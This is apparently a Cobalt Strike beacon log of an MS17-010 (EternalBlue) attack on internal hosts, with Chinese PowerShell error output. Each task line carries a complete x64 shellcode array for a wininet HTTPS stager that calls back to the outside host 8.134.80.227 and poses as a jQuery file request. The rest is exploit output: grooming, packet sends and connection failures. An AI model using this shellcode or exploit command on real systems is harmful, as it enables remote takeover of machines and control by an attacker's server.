+12/21 18:33:43 UTC [task] <T1086, T1093> Tasked beacon to run: Invoke-EternalBlue -Target 192.168.20.215 -Shellcode @(0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x75, 0x72, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4f, 0xff, 0xff, 0xff, 0x5d, 0x6a, 0x00, 0x49, 0xbe, 0x77, 0x69, 0x6e, 0x69, 0x6e, 0x65, 0x74, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x48, 0x31, 0xd2, 0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9, 0x41, 0x50, 0x41, 0x50, 0x41, 0xba, 0x3a, 0x56, 0x79, 0xa7, 0xff, 0xd5, 0xe9, 0x93, 0x00, 0x00, 0x00, 0x5a, 0x48, 0x89, 0xc1, 0x41, 0xb8, 0xbb, 0x01, 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x6a, 0x03, 0x41, 0x51, 0x41, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x79, 0x5b, 0x48, 0x89, 0xc1, 0x48, 0x31, 0xd2, 0x49, 0x89, 0xd8, 0x4d, 0x31, 0xc9, 0x52, 0x68, 0x00, 0x32, 0xc0, 0x84, 0x52, 0x52, 0x41, 0xba, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x48, 0x83, 0xc3, 0x50, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0xba, 0x1f, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x68, 0x80, 0x33, 0x00, 0x00, 0x49, 0x89, 0xe0, 0x41, 0xb9, 0x04, 0x00, 0x00, 0x00, 0x41, 0xba, 0x75, 0x46, 0x9e, 0x86, 0xff, 0xd5, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x4d, 0x31, 0xc9, 0x52, 0x52, 0x41, 0xba, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x85, 0x9d, 0x01, 0x00, 0x00, 0x48, 0xff, 0xcf, 0x0f, 0x84, 0x8c, 0x01, 0x00, 0x00, 0xeb, 0xb3, 0xe9, 0xe4, 0x01, 0x00, 0x00, 0xe8, 0x82, 0xff, 0xff, 0xff, 0x2f, 0x6a, 0x71, 0x75, 0x65, 0x72, 0x79, 0x2d, 0x33, 0x2e, 0x33, 0x2e, 0x32, 0x2e, 0x73, 0x6c, 0x69, 0x6d, 0x2e, 0x6d, 0x69, 0x6e, 0x2e, 0x6a, 0x73, 0x00, 0xd6, 0x02, 0x45, 0x4f, 0x17, 0x1a, 0xb2, 0x2d, 0x7c, 0xc5, 0x20, 0x8c, 0xd4, 0x73, 0x49, 0x1f, 0x92, 0x8f, 0x0a, 0xce, 0x59, 0x22, 0xe6, 0x81, 0x79, 0x77, 0xee, 0x1d, 0x86, 0x8c, 0x92, 0xcc, 0xa5, 0xb4, 0x54, 0xe1, 0x5c, 0x35, 0x0f, 0xf3, 0x5b, 0xe9, 0xcd, 0xdb, 0x27, 0x94, 0xcf, 0x18, 0x47, 0x99, 0x19, 0x07, 0x69, 0x00, 0x41, 0x63, 0x63, 0x65, 0x70, 0x74, 0x3a, 0x20, 0x74, 0x65, 0x78, 0x74, 0x2f, 0x68, 0x74, 0x6d, 0x6c, 0x2c, 0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x78, 0x68, 0x74, 0x6d, 0x6c, 0x2b, 0x78, 0x6d, 0x6c, 0x2c, 0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x78, 0x6d, 0x6c, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x39, 0x2c, 0x2a, 0x2f, 0x2a, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x38, 0x0d, 0x0a, 0x41, 0x63, 0x63, 0x65, 0x70, 0x74, 0x2d, 0x4c, 0x61, 0x6e, 0x67, 0x75, 0x61, 0x67, 0x65, 0x3a, 0x20, 0x65, 0x6e, 0x2d, 0x55, 0x53, 0x2c, 0x65, 0x6e, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x35, 0x0d, 0x0a, 0x52, 0x65, 0x66, 0x65, 0x72, 0x65, 0x72, 0x3a, 0x20, 0x68, 0x74, 0x74, 0x70, 0x3a, 0x2f, 0x2f, 0x63, 0x6f, 0x64, 0x65, 0x2e, 0x6a, 0x71, 0x75, 0x65, 0x72, 0x79, 0x2e, 0x63, 0x6f, 0x6d, 0x2f, 0x0d, 0x0a, 0x41, 0x63, 0x63, 0x65, 0x70, 0x74, 0x2d, 0x45, 0x6e, 0x63, 0x6f, 0x64, 0x69, 0x6e, 0x67, 0x3a, 0x20, 0x67, 0x7a, 0x69, 0x70, 0x2c, 0x20, 0x64, 0x65, 0x66, 0x6c, 0x61, 0x74, 0x65, 0x0d, 0x0a, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x31, 0x31, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x33, 0x32, 0x3b, 0x20, 0x78, 0x38, 0x36, 0x29, 0x20, 0x41, 0x70, 0x70, 0x6c, 0x65, 0x57, 0x65, 0x62, 0x4b, 0x69, 0x74, 0x2f, 0x35, 0x33, 0x31, 0x2e, 0x32, 0x36, 0x20, 0x28, 0x4b, 0x48, 0x54, 0x4d, 0x4c, 0x2c, 0x20, 0x6c, 0x69, 0x6b, 0x65, 0x20, 0x47, 0x65, 0x63, 0x6b, 0x6f, 0x29, 0x20, 0x43, 0x68, 0x72, 0x6f, 0x6d, 0x65, 0x2f, 0x39, 0x32, 0x2e, 0x30, 0x2e, 0x34, 0x36, 0x31, 0x35, 0x2e, 0x31, 0x31, 0x37, 0x20, 0x53, 0x61, 0x66, 0x61, 0x72, 0x69, 0x2f, 0x35, 0x33, 0x37, 0x2e, 0x31, 0x31, 0x0d, 0x0a, 0x00, 0xe7, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0xaf, 0x0f, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x7f, 0xfd, 0xff, 0xff, 0x38, 0x2e, 0x31, 0x33, 0x34, 0x2e, 0x38, 0x30, 0x2e, 0x32, 0x32, 0x37, 0x00, 0x51, 0x09, 0xbf, 0x6d) -InitialGrooms 12 -MaxAttempts 5 (unmanaged)
+12/21 18:33:43 UTC [checkin] host called home, sent: 142949 bytes
+12/21 18:33:46 UTC [output]
+received output:
+VERBOSE: Connecting to target for activities
+VERBOSE: Connection established for exploitation.
+VERBOSE: all but last fragment of exploit packet
+
+
+12/21 18:33:48 UTC [output]
+received output:
+VERBOSE: Running final exploit packet
+
+
+12/21 18:33:50 UTC [output]
+received output:
+VERBOSE: socket error, exploit may fail 
+VERBOSE: SMB code: 00-00
+VERBOSE: Send the payload with the grooms
+
+
+12/21 18:33:54 UTC [output]
+received output:
+VERBOSE: Connecting to target for activities
+
+
+12/21 18:34:33 UTC [output]
+received output:
+ERROR: New-Object : 使用“2”个参数调用“.ctor”时发生异常:“由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。 192.168.20.215:445”
+ERROR: 所在位置 行:558 字符: 25
+ERROR: +     $client = New-Object <<<<  System.Net.Sockets.TcpClient($Target,445)
+ERROR:     + CategoryInfo          : InvalidOperation: (:) [New-Object], MethodInvocationException
+ERROR:     + FullyQualifiedErrorId : ConstructorInvokedThrowException,Microsoft.PowerShell.Commands.NewOb 
+ERROR:    jectCommand
+ERROR:  
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:534 字符: 15
+ERROR: +     $sock.Send <<<< ($raw_proto) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+VERBOSE: socket error, exploit may fail 
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:541 字符: 15
+ERROR: +     $sock.Send <<<< ($raw_proto) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+VERBOSE: socket error, exploit may fail 
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:549 字符: 15
+ERROR: +     $sock.Send <<<< ($raw_proto) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+VERBOSE: socket error, exploit may fail 
+ERROR: 在此对象上找不到属性“ReceiveTimeout”；请确保该属性存在且可设置。
+ERROR: 所在位置 行:649 字符: 12
+ERROR: +      $sock. <<<< ReceiveTimeout =2000
+ERROR:     + CategoryInfo          : InvalidOperation: (ReceiveTimeout:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : PropertyNotFound
+ERROR:  
+VERBOSE: Connection established for exploitation.
+VERBOSE: all but last fragment of exploit packet
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:581 字符: 15
+ERROR: +     $sock.Send <<<< ($nt_trans_pkt) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+VERBOSE: socket error, exploit may fail 
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:595 字符: 15
+ERROR: +     $sock.Send <<<< ($trans2_pkt_nulled) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+VERBOSE: socket error, exploit may fail 
+
+
+12/21 18:34:37 UTC [output]
+received output:
+ERROR: New-Object : 使用“2”个参数调用“.ctor”时发生异常:“由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。 192.168.20.215:445”
+ERROR: 所在位置 行:603 字符: 24
+ERROR: +    $client = New-Object <<<<  System.Net.Sockets.TcpClient($Target,445)
+ERROR:     + CategoryInfo          : InvalidOperation: (:) [New-Object], MethodInvocationException
+ERROR:     + FullyQualifiedErrorId : ConstructorInvokedThrowException,Microsoft.PowerShell.Commands.NewOb 
+ERROR:    jectCommand
+ERROR:  
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:534 字符: 15
+ERROR: +     $sock.Send <<<< ($raw_proto) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+VERBOSE: socket error, exploit may fail 
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:614 字符: 15
+ERROR: +     $sock.Send <<<< ($pkt) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+VERBOSE: socket error, exploit may fail 
+
+
+12/21 18:34:44 UTC [output]
+-------------------------------------------------------------MS17010利用------------------------------------------------------------
+
+12/21 18:34:49 UTC [task] <T1086, T1064> Tasked beacon to import: D:\SecTools\CS\Plugins\XiePlugin\powershell\Invoke-EternalBlue.ps1
+12/21 18:34:49 UTC [task] <T1086, T1093> Tasked beacon to run: Invoke-EternalBlue -Target 192.168.20.25 -Shellcode @(0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x75, 0x72, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4f, 0xff, 0xff, 0xff, 0x5d, 0x6a, 0x00, 0x49, 0xbe, 0x77, 0x69, 0x6e, 0x69, 0x6e, 0x65, 0x74, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x48, 0x31, 0xd2, 0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9, 0x41, 0x50, 0x41, 0x50, 0x41, 0xba, 0x3a, 0x56, 0x79, 0xa7, 0xff, 0xd5, 0xe9, 0x93, 0x00, 0x00, 0x00, 0x5a, 0x48, 0x89, 0xc1, 0x41, 0xb8, 0xbb, 0x01, 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x6a, 0x03, 0x41, 0x51, 0x41, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x79, 0x5b, 0x48, 0x89, 0xc1, 0x48, 0x31, 0xd2, 0x49, 0x89, 0xd8, 0x4d, 0x31, 0xc9, 0x52, 0x68, 0x00, 0x32, 0xc0, 0x84, 0x52, 0x52, 0x41, 0xba, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x48, 0x83, 0xc3, 0x50, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0xba, 0x1f, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x68, 0x80, 0x33, 0x00, 0x00, 0x49, 0x89, 0xe0, 0x41, 0xb9, 0x04, 0x00, 0x00, 0x00, 0x41, 0xba, 0x75, 0x46, 0x9e, 0x86, 0xff, 0xd5, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x4d, 0x31, 0xc9, 0x52, 0x52, 0x41, 0xba, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x85, 0x9d, 0x01, 0x00, 0x00, 0x48, 0xff, 0xcf, 0x0f, 0x84, 0x8c, 0x01, 0x00, 0x00, 0xeb, 0xb3, 0xe9, 0xe4, 0x01, 0x00, 0x00, 0xe8, 0x82, 0xff, 0xff, 0xff, 0x2f, 0x6a, 0x71, 0x75, 0x65, 0x72, 0x79, 0x2d, 0x33, 0x2e, 0x33, 0x2e, 0x32, 0x2e, 0x73, 0x6c, 0x69, 0x6d, 0x2e, 0x6d, 0x69, 0x6e, 0x2e, 0x6a, 0x73, 0x00, 0x1e, 0xdb, 0x0f, 0x00, 0xf9, 0xaa, 0x81, 0x75, 0x2f, 0x86, 0xa6, 0x5a, 0x11, 0x59, 0x17, 0xd2, 0x7a, 0x63, 0x9e, 0xe5, 0x16, 0xd1, 0xf1, 0x53, 0xad, 0xdb, 0xd9, 0xa6, 0x4f, 0xc3, 0xc9, 0xf7, 0x6a, 0xe5, 0xf3, 0x18, 0xa0, 0x90, 0x32, 0x97, 0x68, 0xda, 0xa3, 0xaa, 0x13, 0x1e, 0xc8, 0x08, 0xc2, 0xcc, 0x19, 0x4f, 0x0c, 0x00, 0x41, 0x63, 0x63, 0x65, 0x70, 0x74, 0x3a, 0x20, 0x74, 0x65, 0x78, 0x74, 0x2f, 0x68, 0x74, 0x6d, 0x6c, 0x2c, 0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x78, 0x68, 0x74, 0x6d, 0x6c, 0x2b, 0x78, 0x6d, 0x6c, 0x2c, 0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x78, 0x6d, 0x6c, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x39, 0x2c, 0x2a, 0x2f, 0x2a, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x38, 0x0d, 0x0a, 0x41, 0x63, 0x63, 0x65, 0x70, 0x74, 0x2d, 0x4c, 0x61, 0x6e, 0x67, 0x75, 0x61, 0x67, 0x65, 0x3a, 0x20, 0x65, 0x6e, 0x2d, 0x55, 0x53, 0x2c, 0x65, 0x6e, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x35, 0x0d, 0x0a, 0x52, 0x65, 0x66, 0x65, 0x72, 0x65, 0x72, 0x3a, 0x20, 0x68, 0x74, 0x74, 0x70, 0x3a, 0x2f, 0x2f, 0x63, 0x6f, 0x64, 0x65, 0x2e, 0x6a, 0x71, 0x75, 0x65, 0x72, 0x79, 0x2e, 0x63, 0x6f, 0x6d, 0x2f, 0x0d, 0x0a, 0x41, 0x63, 0x63, 0x65, 0x70, 0x74, 0x2d, 0x45, 0x6e, 0x63, 0x6f, 0x64, 0x69, 0x6e, 0x67, 0x3a, 0x20, 0x67, 0x7a, 0x69, 0x70, 0x2c, 0x20, 0x64, 0x65, 0x66, 0x6c, 0x61, 0x74, 0x65, 0x0d, 0x0a, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x31, 0x31, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x33, 0x32, 0x3b, 0x20, 0x78, 0x38, 0x36, 0x29, 0x20, 0x41, 0x70, 0x70, 0x6c, 0x65, 0x57, 0x65, 0x62, 0x4b, 0x69, 0x74, 0x2f, 0x35, 0x33, 0x31, 0x2e, 0x32, 0x36, 0x20, 0x28, 0x4b, 0x48, 0x54, 0x4d, 0x4c, 0x2c, 0x20, 0x6c, 0x69, 0x6b, 0x65, 0x20, 0x47, 0x65, 0x63, 0x6b, 0x6f, 0x29, 0x20, 0x43, 0x68, 0x72, 0x6f, 0x6d, 0x65, 0x2f, 0x39, 0x32, 0x2e, 0x30, 0x2e, 0x34, 0x36, 0x31, 0x35, 0x2e, 0x31, 0x31, 0x37, 0x20, 0x53, 0x61, 0x66, 0x61, 0x72, 0x69, 0x2f, 0x35, 0x33, 0x37, 0x2e, 0x31, 0x31, 0x0d, 0x0a, 0x00, 0xe0, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0xaf, 0x0f, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x7f, 0xfd, 0xff, 0xff, 0x38, 0x2e, 0x31, 0x33, 0x34, 0x2e, 0x38, 0x30, 0x2e, 0x32, 0x32, 0x37, 0x00, 0x51, 0x09, 0xbf, 0x6d) -InitialGrooms 12 -MaxAttempts 5 (unmanaged)
+12/21 18:34:49 UTC [checkin] host called home, sent: 142949 bytes
+12/21 18:34:54 UTC [output]
+received output:
+VERBOSE: Connecting to target for activities
+VERBOSE: Connection established for exploitation.
+VERBOSE: all but last fragment of exploit packet
+
+
+12/21 18:34:55 UTC [output]
+received output:
+VERBOSE: socket error, exploit may fail 
+
+
+12/21 18:34:56 UTC [output]
+received output:
+VERBOSE: socket error, exploit may fail 
+VERBOSE: Running final exploit packet
+VERBOSE: socket error, exploit may fail 
+VERBOSE: SMB code: 00-00
+VERBOSE: Send the payload with the grooms
+
+
+12/21 18:34:59 UTC [output]
+received output:
+ERROR: New-Object : 使用“2”个参数调用“.ctor”时发生异常:“由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。 192.168.20.215:445”
+ERROR: 所在位置 行:624 字符: 33
+ERROR: +             $client = New-Object <<<<  System.Net.Sockets.TcpClient($Target,445)
+ERROR:     + CategoryInfo          : InvalidOperation: (:) [New-Object], MethodInvocationException
+ERROR:     + FullyQualifiedErrorId : ConstructorInvokedThrowException,Microsoft.PowerShell.Commands.NewOb 
+ERROR:    jectCommand
+ERROR:  
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:628 字符: 25
+ERROR: +              $gsock.Send <<<< ($payload_hdr_pkt) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+
+
+12/21 18:35:00 UTC [output]
+received output:
+VERBOSE: Connecting to target for activities
+VERBOSE: Connection established for exploitation.
+VERBOSE: all but last fragment of exploit packet
+
+
+12/21 18:35:00 UTC [output]
+received output:
+ERROR: New-Object : 使用“2”个参数调用“.ctor”时发生异常:“由于目标计算机积极拒绝，无法连接。 192.168.20.215:445”
+ERROR: 所在位置 行:624 字符: 33
+ERROR: +             $client = New-Object <<<<  System.Net.Sockets.TcpClient($Target,445)
+ERROR:     + CategoryInfo          : InvalidOperation: (:) [New-Object], MethodInvocationException
+ERROR:     + FullyQualifiedErrorId : ConstructorInvokedThrowException,Microsoft.PowerShell.Commands.NewOb 
+ERROR:    jectCommand
+ERROR:  
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:628 字符: 25
+ERROR: +              $gsock.Send <<<< ($payload_hdr_pkt) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+ERROR: New-Object : 使用“2”个参数调用“.ctor”时发生异常:“由于目标计算机积极拒绝，无法连接。 192.168.20.215:445”
+ERROR: 所在位置 行:624 字符: 33
+ERROR: +             $client = New-Object <<<<  System.Net.Sockets.TcpClient($Target,445)
+ERROR:     + CategoryInfo          : InvalidOperation: (:) [New-Object], MethodInvocationException
+ERROR:     + FullyQualifiedErrorId : ConstructorInvokedThrowException,Microsoft.PowerShell.Commands.NewOb 
+ERROR:    jectCommand
+ERROR:  
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:628 字符: 25
+ERROR: +              $gsock.Send <<<< ($payload_hdr_pkt) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+ERROR: New-Object : 使用“2”个参数调用“.ctor”时发生异常:“由于目标计算机积极拒绝，无法连接。 192.168.20.215:445”
+ERROR: 所在位置 行:624 字符: 33
+ERROR: +             $client = New-Object <<<<  System.Net.Sockets.TcpClient($Target,445)
+ERROR:     + CategoryInfo          : InvalidOperation: (:) [New-Object], MethodInvocationException
+ERROR:     + FullyQualifiedErrorId : ConstructorInvokedThrowException,Microsoft.PowerShell.Commands.NewOb 
+ERROR:    jectCommand
+ERROR:  
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:628 字符: 25
+ERROR: +              $gsock.Send <<<< ($payload_hdr_pkt) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+
+
+12/21 18:35:03 UTC [output]
+received output:
+ERROR: New-Object : 使用“2”个参数调用“.ctor”时发生异常:“由于目标计算机积极拒绝，无法连接。 192.168.20.215:445”
+ERROR: 所在位置 行:624 字符: 33
+ERROR: +             $client = New-Object <<<<  System.Net.Sockets.TcpClient($Target,445)
+ERROR:     + CategoryInfo          : InvalidOperation: (:) [New-Object], MethodInvocationException
+ERROR:     + FullyQualifiedErrorId : ConstructorInvokedThrowException,Microsoft.PowerShell.Commands.NewOb 
+ERROR:    jectCommand
+ERROR:  
+ERROR: 不能对值为空的表达式调用方法。
